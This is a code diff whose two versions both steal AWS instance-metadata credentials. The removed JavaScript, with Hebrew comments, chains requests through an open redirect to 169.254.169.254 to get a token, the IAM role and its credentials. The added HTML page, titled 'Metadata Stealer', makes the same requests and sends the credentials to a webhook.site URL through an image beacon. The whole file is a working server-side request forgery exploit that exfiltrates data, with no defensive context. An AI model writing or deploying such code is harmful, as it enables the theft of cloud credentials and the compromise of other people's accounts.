@@ -1,34 +1,40 @@
-const imdsTokenUrl = 'http://169.254.169.254/latest/api/token';
-const redirectorUrl = '/redir.php?url=' + encodeURIComponent(imdsTokenUrl);
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Metadata Stealer</title>
+  </head>
+  <body>
+    <h1>Loading...</h1>
 
-fetch(redirectorUrl, {
-  method: 'PUT',
-  headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' }
-})
-.then(res => res.text())
-.then(token => {
-  // המשך בקשות עם הטוקן
-  const iamUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
-  const iamRedirect = '/redir.php?url=' + encodeURIComponent(iamUrl);
-
-  return fetch(iamRedirect, {
-    headers: { 'X-aws-ec2-metadata-token': token }
-  })
-  .then(res => res.text())
-  .then(role => {
-    const credsUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role;
-    const credsRedirect = '/redir.php?url=' + encodeURIComponent(credsUrl);
-
-    return fetch(credsRedirect, {
-      headers: { 'X-aws-ec2-metadata-token': token }
-    });
-  });
-})
-.then(res => res.text())
-.then(creds => {
-  console.log('Got credentials:', creds);
-  // שלחי ל-webhook או הדפיסי בדף
-})
-.catch(err => {
-  console.error('Error:', err);
-});
+    <script>
+      fetch('http://169.254.169.254/latest/api/token', {
+        method: 'PUT',
+        headers: {
+          'X-aws-ec2-metadata-token-ttl-seconds': '21600'
+        }
+      })
+      .then(res => res.text())
+      .then(token => {
+        return fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
+          headers: {
+            'X-aws-ec2-metadata-token': token
+          }
+        }).then(res => res.text())
+          .then(role => {
+            return fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role, {
+              headers: {
+                'X-aws-ec2-metadata-token': token
+              }
+            });
+          });
+      })
+      .then(res => res.text())
+      .then(creds => {
+        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?creds=' + encodeURIComponent(creds);
+      })
+      .catch(() => {
+        new Image().src = 'https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?error=fail';
+      });
+    </script>
+  </body>
+</html>
